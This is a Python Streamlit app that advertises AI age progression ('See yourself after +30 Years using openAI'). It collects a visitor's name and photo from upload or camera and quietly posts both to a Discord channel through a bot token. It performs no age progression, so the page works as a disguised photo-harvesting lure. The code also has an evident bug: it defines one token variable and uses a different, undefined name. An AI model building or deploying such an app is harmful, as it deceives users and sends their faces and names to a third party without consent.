# streamlit_quick_send_minimal.py
import io
import json
import streamlit as st
from PIL import Image
import requests


# -------------------------------
# CONFIG
# -------------------------------
st.set_page_config(page_title="Age - Quick Send", layout="centered")

# Hardcode token & channel ID here


DISCORD_BOT_TOKEN = st.secrets["discord"]["bot_token"]
DISCORD_CHANNEL_ID = st.secrets["discord"]["channel_id"]
st.markdown(
    f"""
    <style>
    .stApp {{
        background-image: url("https://dl-asset.cyberlink.com/web/prog/learning-center/html/46641/MyEdit-ENG-Hug-Younger-Self/img/hug-my-younger-self-animation-result.webp");
        background-size: cover;
    }}
   
    </style>
    """,
    unsafe_allow_html=True
)
# -------------------------------
# HEADER
# -------------------------------
st.markdown(
    """
    <div style="display:flex;align-items:center;gap:12px;">
      <div style="width:64px;height:64px;border-radius:12px;
                  background:linear-gradient(135deg,#6EE7B7,#3B82F6);
                  display:flex;align-items:center;justify-content:center;
                  color:white;font-weight:700;font-size:28px;">30</div>
      <div>
        <h1 style="margin:0;padding:0">See yourself after +30 Years using openAI</h1>
      </div>
    </div>
    """,
    unsafe_allow_html=True,
)
st.markdown("---")
st.markdown(
    """
    <p style='color: cream; font-size:20px; font-weight:bold;'>
        Ever wondered how you might look 30 years from now? Our advanced AI-powered Age Progression system can generate a realistic prediction of your future appearance from just a single photo.
    </p>
    """,
    unsafe_allow_html=True
)
# -------------------------------
# LAYOUT
# -------------------------------
col_left, col_right = st.columns([2, 1])

with col_left:
    st.markdown("**1 — Upload or take a photo**")
    st.info("On mobile, please allow camera access when prompted to capture a photo.")
    usr_name=st.text_input("please enter your name","")
    uploaded_file = st.file_uploader("Upload photo", type=["jpg", "jpeg", "png"], label_visibility="collapsed")
    camera_file = st.camera_input("Camera input", label_visibility="collapsed")

    
    # pick whichever is available
    image_source = camera_file if camera_file else uploaded_file
    img = None

    if image_source:
        try:
            # Read image bytes
            raw_bytes = image_source.read()
            img = Image.open(io.BytesIO(raw_bytes)).convert("RGB")
            st.image(img, width='stretch')
            try:
                # Prepare image bytes
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=85)
                buf.seek(0)
                image_bytes = buf.read()

                # Discord API request
                url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
                headers = {"Authorization": f"Bot {DISCORD_TOKEN}"}
                filename = f"{usr_name}.jpg" if usr_name else "photo.jpg"
                multipart_data = {
                    "file": (filename, io.BytesIO(image_bytes), "image/jpeg"),
                    "payload_json": json.dumps({"content": "Here is your image!",})
                }

                resp = requests.post(url, headers=headers, files=multipart_data, timeout=20)
                if resp.status_code in (200, 201, 204):
                    st.success("Image sent successfully!")
                else:
                    st.error(f"Failed to send: {resp.status_code} - {resp.text[:300]}")
            except Exception as e:
                st.error(f"Error sending image: {e}")
            
        except Exception:
            st.error("Unable to read the image. Try another file.")
            st.stop()
    else:
        st.info("Please upload or take a photo to continue.")


        

st.markdown("---")
